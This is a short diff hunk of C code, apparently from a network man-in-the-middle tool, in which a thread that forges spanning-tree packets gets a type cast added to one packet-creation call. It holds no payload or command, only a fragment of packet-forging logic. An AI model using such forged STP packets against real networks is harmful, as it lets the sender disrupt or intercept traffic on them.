@@ -162,7 +162,7 @@ EC_THREAD_FUNC(mangler)
    hstp->hello_time = htons_inv(2);
    hstp->forward_delay = htons_inv(15);
 
-   packet_create_object(&fake_po, fake_pck, FAKE_PCK_LEN);
+   packet_create_object(&fake_po, (u_char*)fake_pck, FAKE_PCK_LEN);
 
    /* init the thread and wait for start up */
    ec_thread_init();
